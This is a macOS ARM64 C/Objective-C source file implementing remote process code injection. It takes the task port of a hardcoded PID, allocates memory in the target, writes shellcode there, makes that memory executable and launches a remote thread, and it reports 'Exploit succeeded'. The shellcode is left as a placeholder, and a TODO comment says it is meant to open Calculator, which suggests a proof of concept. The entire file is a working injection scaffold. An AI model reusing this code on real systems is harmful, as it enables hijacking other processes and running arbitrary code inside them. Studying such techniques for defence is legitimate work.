#import <AppKit/AppKit.h>
#import <Foundation/Foundation.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>

#define STACK_SIZE 0x1000
#define CODE_SIZE 512

// TODO shellcode arm "open /System/Applications/Calculator.app"
char shellcode[] = "\x00";

int main(int argc, const char *argv[]) {
  pid_t pid = 49175;
  task_t remoteTask;

  kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
  if (kr != KERN_SUCCESS) {
    printf("[-] Failed to get task port for pid:%d, error: %s\n", pid,
           mach_error_string(kr));
    exit(-1);
  } else {
    printf("[+] Got access to the task port of process: %d\n", pid);
  }

  mach_vm_address_t remoteStack64 = (vm_address_t)NULL;
  mach_vm_address_t remoteCode64 = (vm_address_t)NULL;

  kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE,
                        VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    printf("[-] Failed to allocate stack memory in remote thread, error: %s\n",
           mach_error_string(kr));
    exit(-1);
  } else {
    printf("[+] Allocated remote stack: 0x%llx\n", remoteStack64);
  }

  kr =
      mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    printf("[-] Failed to allocate code memory in remote thread, error: %s\n",
           mach_error_string(kr));
    exit(-1);
  } else {
    printf("[+] Allocated remote code placeholder: 0x%llx\n", remoteCode64);
  }

  kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t)shellcode,
                     CODE_SIZE);
  if (kr != KERN_SUCCESS) {
    printf("[-] Failed to write into remote thread memory, error: %s\n",
           mach_error_string(kr));
    exit(-1);
  }

  kr = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE,
                  VM_PROT_READ | VM_PROT_EXECUTE);
  if (kr != KERN_SUCCESS) {
    printf("[!] Failed to give injected code memory proper permissions, "
           "error: %s\n",
           mach_error_string(kr));
    exit(-1);
  }

  kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,
                  VM_PROT_READ | VM_PROT_WRITE);
  if (kr != KERN_SUCCESS) {
    printf("[!] Failed to give stack memory proper permissions, error: %s\n",
           mach_error_string(kr));
    exit(-1);
  }

  arm_thread_state64_t remoteThreadState64;
  memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
  // shift stack
  remoteStack64 += (STACK_SIZE / 2); // this is the real stack
                                     // set remote instruction pointer
  remoteThreadState64.__pc = (u_int64_t)remoteCode64;
  // set remote Stack Pointer
  remoteThreadState64.__sp = (u_int64_t)remoteStack64;
  // remoteThreadState64.__fp = (u_int64_t)remoteStack64;
  printf("[+] Remote Stack 64  0x%llx, Remote code is 0x%llx\n", remoteStack64,
         remoteCode64);
  // thread variable
  thread_act_t remoteThread;
  // create thread
  kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                             (thread_state_t)&remoteThreadState64,
                             ARM_THREAD_STATE64_COUNT, &remoteThread);
  if (kr != KERN_SUCCESS) {
    printf("[-] Exploit failed: error: %s\n", mach_error_string(kr));
    return (-1);
  }
  printf("[+] Exploit succeeded!\n");
  return (0);
}